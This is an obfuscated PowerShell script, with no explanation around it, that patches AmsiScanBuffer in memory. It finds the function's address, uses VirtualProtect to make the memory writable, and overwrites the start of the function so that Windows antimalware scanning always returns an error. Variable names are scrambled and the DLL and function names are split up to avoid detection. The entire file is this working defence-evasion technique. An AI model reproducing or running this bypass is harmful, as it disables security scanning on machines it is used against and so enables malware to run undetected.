function Get-FunctionBaseAddress {
    Param ($jIbyTTEdfNkRSnxLLPxHLJfdGPvxreBLBLEQJ, $CPuKgDZpBRAsCrMeUVss)
    $PjuDxrjAnKfAbFwvoABfeWziaxmWxvHkCTMFzvnxxAFSH = ([AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $EvpYzMBCgqZkgjtxGCKuyDKmAlwiEdMbWBtTyCanevAx = $PjuDxrjAnKfAbFwvoABfeWziaxmWxvHkCTMFzvnxxAFSH.GetMethods() | ? { $_.Name -eq "GetProcAddress" }
    $aJHeYQnELMEvVcRWixcVdMbwyubDKSdYkJcpQMEwU = $EvpYzMBCgqZkgjtxGCKuyDKmAlwiEdMbWBtTyCanevAx[0].Invoke($null, ($PjuDxrjAnKfAbFwvoABfeWziaxmWxvHkCTMFzvnxxAFSH.GetMethod('GetModuleHandle').Invoke($null,@($jIbyTTEdfNkRSnxLLPxHLJfdGPvxreBLBLEQJ)), $CPuKgDZpBRAsCrMeUVss))
    return $aJHeYQnELMEvVcRWixcVdMbwyubDKSdYkJcpQMEwU
}
function Get-DelegateType {
    Param ([Type[]] $DzKOhnNuKRUYuekToZFWbV, [Type] $wEVRQwVnRbXGyCVYfiTSzuzwEd = [Void] )
    $GzqOBbKfuvNJKyFxRGTKlHcfy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
    $GzqOBbKfuvNJKyFxRGTKlHcfy.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $DzKOhnNuKRUYuekToZFWbV).SetImplementationFlags('Runtime, Managed')
    $GzqOBbKfuvNJKyFxRGTKlHcfy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $wEVRQwVnRbXGyCVYfiTSzuzwEd, $DzKOhnNuKRUYuekToZFWbV).SetImplementationFlags('Runtime, Managed')
    return $GzqOBbKfuvNJKyFxRGTKlHcfy.CreateType()
}
$bytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[IntPtr]$CPoQrCLYikCgWyEfAUaPqaQZDsEvkFfpVo = Get-FunctionBaseAddress -jIbyTTEdfNkRSnxLLPxHLJfdGPvxreBLBLEQJ ("am"+"si.dll") -CPuKgDZpBRAsCrMeUVss ("Amsi"+"Scan"+"Buffer")
$XCQDadxNbLfURFNOJXQrZIlcpxtZbOIzANFLnvn = 0
[IntPtr] $UYLcDDeuSsOzSZNbbXOwEvpDlB = Get-FunctionBaseAddress -jIbyTTEdfNkRSnxLLPxHLJfdGPvxreBLBLEQJ ("kern"+"el32.dll") -CPuKgDZpBRAsCrMeUVss ("Virtual"+"Protect")
$DobDKGWWGsBCoIZctBOy = Get-DelegateType -DzKOhnNuKRUYuekToZFWbV @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) -wEVRQwVnRbXGyCVYfiTSzuzwEd ([Bool])
$LvNBseRqFuIIJylWWorVOoBOCcKcMqiZUiTgasOsu=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UYLcDDeuSsOzSZNbbXOwEvpDlB, $DobDKGWWGsBCoIZctBOy)
$LvNBseRqFuIIJylWWorVOoBOCcKcMqiZUiTgasOsu.Invoke($CPoQrCLYikCgWyEfAUaPqaQZDsEvkFfpVo, [uint32]5, 0x40, [ref]$XCQDadxNbLfURFNOJXQrZIlcpxtZbOIzANFLnvn)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $CPoQrCLYikCgWyEfAUaPqaQZDsEvkFfpVo, 6)

